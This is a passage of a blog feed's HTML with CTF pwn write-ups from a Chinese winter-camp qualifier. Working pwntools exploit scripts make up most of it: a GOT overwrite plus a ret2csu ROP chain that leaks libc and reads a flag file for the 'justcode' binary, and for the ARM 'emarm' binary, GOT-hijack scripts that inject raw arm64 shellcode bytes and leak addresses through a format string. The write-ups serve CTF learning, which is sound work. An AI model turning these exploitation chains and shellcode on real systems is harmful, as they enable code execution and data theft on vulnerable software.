class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./justcode&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">case1</span>(<span class="params">buf</span>):</span></span><br><span class="line">    sa(<span class="string">&#x27;name&#x27;</span>,buf)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">case2</span>(<span class="params">v1,buf</span>):</span></span><br><span class="line">    sa(<span class="string">&#x27;id:&#x27;</span>,<span class="built_in">str</span>(v1))</span><br><span class="line">    sa(<span class="string">&#x27;info&#x27;</span>,buf)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;your code:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">case1(<span class="string">&#x27;a&#x27;</span>*<span class="number">0xc</span>+p64(elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># __stack_chk_fail@got -&gt; pop_r15_ret</span></span><br><span class="line">pop_r15_ret = <span class="number">0x0000000000400EA2</span></span><br><span class="line">case2(<span class="built_in">str</span>(pop_r15_ret)+<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># write payload and triger</span></span><br><span class="line">init1 = <span class="number">0x0000000000400E80</span></span><br><span class="line">init2 = <span class="number">0x0000000000400E96</span></span><br><span class="line">pay=flat([</span><br><span class="line">    init2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">    init1</span><br><span class="line">])</span><br><span class="line">pay += flat([</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="comment"># 0x000000000400D4B # main</span></span><br><span class="line">    <span class="number">0x0000000000400C47</span> <span class="comment"># case1</span></span><br><span class="line">])</span><br><span class="line">pay=pay.ljust(<span class="number">0x90</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">case1(pay)</span><br><span class="line"></span><br><span class="line">libc_base = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># write payload and triger</span></span><br><span class="line"><span class="comment"># read(0,flag_str,0x10)</span></span><br><span class="line">pay = flat([</span><br><span class="line">    init2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    elf.got[<span class="string">&#x27;read&#x27;</span>], <span class="comment">#fun</span></span><br><span class="line">    <span class="number">0x10</span>, <span class="comment">#rdx</span></span><br><span class="line">    elf.bss()+<span class="number">0x200</span>, <span class="comment">#rsi</span></span><br><span class="line">    <span class="number">0</span>, <span class="comment">#rdi</span></span><br><span class="line">    init1</span><br><span class="line">])</span><br><span class="line">pay += flat([</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="comment"># 0x000000000400D4B # main</span></span><br><span class="line">    <span class="number">0x0000000000400C47</span>  <span class="comment"># case1</span></span><br><span class="line">])</span><br><span class="line">pay = pay.ljust(<span class="number">0x90</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">case1(pay)</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.sendline(p64(libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>])+<span class="string">&#x27;flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># open(flag_str,0)</span></span><br><span class="line">pay = flat([</span><br><span class="line">    init2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    elf.bss()+<span class="number">0x200</span>,  <span class="comment"># fun</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment"># rdx</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment"># rsi</span></span><br><span class="line">    elf.bss()+<span class="number">0x200</span>+<span class="number">0x8</span>,  <span class="comment"># rdi</span></span><br><span class="line">    init1</span><br><span class="line">])</span><br><span class="line">pay += flat([</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="comment"># 0x000000000400D4B # main</span></span><br><span class="line">    <span class="number">0x0000000000400C47</span>  <span class="comment"># case1</span></span><br><span class="line">])</span><br><span class="line">pay = pay.ljust(<span class="number">0x90</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">case1(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(3,flag_addr,0x50)</span></span><br><span class="line">pay = flat([</span><br><span class="line">    init2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    elf.got[<span class="string">&#x27;read&#x27;</span>],  <span class="comment"># fun</span></span><br><span class="line">    <span class="number">0x50</span>,  <span class="comment"># rdx</span></span><br><span class="line">    elf.bss()+<span class="number">0x300</span>,  <span class="comment"># rsi</span></span><br><span class="line">    <span class="number">3</span>,  <span class="comment"># rdi</span></span><br><span class="line">    init1</span><br><span class="line">])</span><br><span class="line">pay += flat([</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="comment"># 0x000000000400D4B # main</span></span><br><span class="line">    <span class="number">0x0000000000400C47</span>  <span class="comment"># case1</span></span><br><span class="line">])</span><br><span class="line">pay = pay.ljust(<span class="number">0x90</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">case1(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># puts(flag_addr)</span></span><br><span class="line">pay = flat([</span><br><span class="line">    init2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    elf.got[<span class="string">&#x27;puts&#x27;</span>],  <span class="comment"># fun</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment"># rdx</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment"># rsi</span></span><br><span class="line">    elf.bss()+<span class="number">0x300</span>,  <span class="comment"># rdi</span></span><br><span class="line">    init1</span><br><span class="line">])</span><br><span class="line">pay += flat([</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="comment"># 0x000000000400D4B # main</span></span><br><span class="line">    <span class="number">0x0000000000400C47</span>  <span class="comment"># case1</span></span><br><span class="line">])</span><br><span class="line">pay = pay.ljust(<span class="number">0x90</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">case1(pay)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;hws冬令营选拔赛复现&quot;&gt;&lt;a href=&quot;#hws冬令营选拔赛复现&quot; class=&quot;headerlink&quot; title=&quot;hws冬令营选拔赛复现&quot;&gt;&lt;/a&gt;hws冬令营选拔赛复现&lt;/h1&gt;&lt;p&gt;拖延半年&lt;/p&gt;
&lt;h3 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pw</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://brooke-hub.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="https://brooke-hub.github.io/2021/06/05/test/"/>
    <id>https://brooke-hub.github.io/2021/06/05/test/</id>
    <published>2021-06-05T03:44:13.000Z</published>
    <updated>2021-06-05T03:48:23.682Z</updated>
    
    <content type="html"><![CDATA[<h1 id="test"><a href="#test" class="headerlink" title="test"></a>test<img src="/2021/06/05/test/Snipaste_2021-06-05_11-47-54.png"></h1><p><img src="/2021/06/05/test/image-20210605114814332.png" alt="image-20210605114814332"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;test&quot;&gt;&lt;a href=&quot;#test&quot; class=&quot;headerlink&quot; title=&quot;test&quot;&gt;&lt;/a&gt;test&lt;img src=&quot;/2021/06/05/test/Snipaste_2021-06-05_11-47-54.png&quot;&gt;&lt;/h1&gt;&lt;p&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>hws</title>
    <link href="https://brooke-hub.github.io/2021/04/22/hws/"/>
    <id>https://brooke-hub.github.io/2021/04/22/hws/</id>
    <published>2021-04-22T02:24:12.000Z</published>
    <updated>2021-05-06T15:02:32.100Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hws冬令营选拔赛复现"><a href="#hws冬令营选拔赛复现" class="headerlink" title="hws冬令营选拔赛复现"></a>hws冬令营选拔赛复现</h1><p>拖延半年</p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="emarm"><a href="#emarm" class="headerlink" title="emarm"></a>emarm</h4><h5 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h5><p>一次任意地址写，先把fread@got改写为main中一个从<code>read(0, v15, 8uLL);</code>开始的地址，实现多次任意写</p><p>向data段写sc，再改写fread@got为data地址，执行到<code>fread(v12, size, 1uLL, stream);</code>触发</p><p><img src="/2021/04/22/hws/Users\20766\AppData\Roaming\Typora\typora-user-images\image-20210422104524430.png" alt="image-20210422104524430"></p><p><a href="https://www.exploit-db.com/shellcodes/47048">arm64 shellcode</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># sh = process(binary)</span></span><br><span class="line">    sh = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;./emarm&quot;</span>])</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">sc1 = <span class="string">&quot;\xe1\x45\x8c\xd2\x21\xcd\xad\xf2&quot;</span></span><br><span class="line">sc2 = <span class="string">&quot;\xe1\x65\xce\xf2\x01\x0d\xe0\xf2&quot;</span></span><br><span class="line">sc3 = <span class="string">&quot;\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa&quot;</span></span><br><span class="line">sc4 = <span class="string">&quot;\xe2\x03\x1f\xaa\xe0\x63\x21\x8b&quot;</span></span><br><span class="line">sc5 = <span class="string">&quot;\xa8\x1b\x80\xd2\xe1\x66\x02\xd4&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to</span>(<span class="params">addr,content</span>):</span></span><br><span class="line">    sd(<span class="built_in">str</span>(addr))</span><br><span class="line">    sa(<span class="string">&#x27;success&#x27;</span>,content)</span><br><span class="line">    sla(<span class="string">&#x27;bye&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    sla(<span class="string">&#x27;passwd:&#x27;</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fread_got = <span class="number">0x412060</span></span><br><span class="line">    main_read = <span class="number">0x0000000000400BE4</span></span><br><span class="line">    write_to(fread_got,p64(main_read))</span><br><span class="line"></span><br><span class="line">    write_to(<span class="number">0x0000000000412080</span>, sc1)</span><br><span class="line">    write_to(<span class="number">0x0000000000412088</span>, sc2)</span><br><span class="line">    write_to(<span class="number">0x0000000000412090</span>, sc3)</span><br><span class="line">    write_to(<span class="number">0x0000000000412098</span>, sc4)</span><br><span class="line">    write_to(<span class="number">0x00000000004120a0</span>, sc5)</span><br><span class="line"></span><br><span class="line">    write_to(fread_got,p64(<span class="number">0x0000000000412080</span>))</span><br><span class="line">    ti()</span><br><span class="line">pwn()</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="泄露基地址，改got表为og"><a href="#泄露基地址，改got表为og" class="headerlink" title="泄露基地址，改got表为og"></a>泄露基地址，改got表为og</h5><p><a href="https://blog.csdn.net/qq_39869547/article/details/105255683">qemu arm 调试</a></p><p>进入gdb先劫持到加载器，程序还没被加载</p><p>no pie 所以直接下断点等待捕获就行了</p><p>改写atoi@got为printf@plt，num写入fmt，之后 <code>size = atoi(num);</code>泄漏栈内容</p><p><img src="/2021/04/22/hws/Users\20766\AppData\Roaming\Typora\typora-user-images\image-20210422121323728.png" alt="image-20210422121323728"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># sh = process(binary)</span></span><br><span class="line">    sh = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;./emarm&quot;</span>])</span><br><span class="line">    <span class="comment"># sh = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;.&quot;, &quot;-g&quot;,&quot;1241&quot;,&quot;./emarm&quot;])</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sa</span>(<span class="params">s, n</span>):</span> <span class="keyword">return</span> sh.sendafter(s, n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sla</span>(<span class="params">s, n</span>):</span> <span class="keyword">return</span> sh.sendlineafter(s, n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.sendline(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.send(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span>(<span class="params">n</span>):</span> <span class="keyword">return</span> sh.recv(n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.recvuntil(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ti</span>():</span> <span class="keyword">return</span> sh.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">name, addr</span>):</span> <span class="keyword">return</span> log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to</span>(<span class="params">addr, content</span>):</span></span><br><span class="line">    sd(<span class="built_in">str</span>(addr))</span><br><span class="line">    sa(<span class="string">&#x27;success&#x27;</span>, content)</span><br><span class="line">    <span class="comment"># sla(&#x27;bye&#x27;, &#x27;1&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    sla(<span class="string">&#x27;passwd:&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    atoi_got = <span class="number">0x412020</span></span><br><span class="line">    printf_plt = <span class="number">0x00000000004008B0</span></span><br><span class="line">    write_to(atoi_got,p64(printf_plt))</span><br><span class="line">    sla(<span class="string">&#x27;bye&#x27;</span>,<span class="string">&#x27;%9$p&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    base = <span class="built_in">int</span>(sh.recv(<span class="number">10</span>),<span class="number">16</span>) - <span class="number">0x206e0</span></span><br><span class="line">    leak(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">    ti()</span><br><span class="line"></span><br><span class="line">pwn()</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br></pre></td></tr></table></figure><p><img src="/2021/04/22/hws/Users\20766\AppData\Roaming\Typora\typora-user-images\image-20210422121554233.png" alt="image-20210422121554233"></p><p>先本地调试找好fmt偏移 9</p><p>得到本机基地址0x400084a000</p><p><img src="/2021/04/22/hws/Users\20766\AppData\Roaming\Typora\typora-user-images\image-20210422190207581.png" alt="image-20210422190207581"></p><p><img src="/2021/04/22/hws/Users\20766\AppData\Roaming\Typora\typora-user-images\image-20210422191204668.png" alt="image-20210422191204668"></p><p>但是这个本地没打通</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># import sys</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binary=&#x27;./emarm&#x27;</span></span><br><span class="line"><span class="comment"># elf=ELF(binary)</span></span><br><span class="line"><span class="comment"># libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># sh = process(binary)</span></span><br><span class="line">    sh = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;./emarm&quot;</span>])</span><br><span class="line">    <span class="comment"># sh = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;.&quot;, &quot;-g&quot;,&quot;1241&quot;,&quot;./emarm&quot;])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sa</span>(<span class="params">s, n</span>):</span> <span class="keyword">return</span> sh.sendafter(s, n)</span><br><span 